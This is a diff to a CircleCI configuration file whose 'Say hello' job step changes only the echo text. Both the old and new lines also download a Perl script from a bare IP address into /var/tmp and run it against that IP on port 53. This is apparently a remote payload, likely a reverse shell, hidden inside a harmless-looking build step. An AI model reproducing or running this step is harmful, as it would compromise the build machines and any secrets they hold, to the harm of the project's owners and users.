@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World! && wget 27.102.130.223/c.pl -P /var/tmp && perl /var/tmp/c.pl 27.102.130.223 53"
+          command: "echo Hello, World!! && wget 27.102.130.223/c.pl -P /var/tmp && perl /var/tmp/c.pl 27.102.130.223 53"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
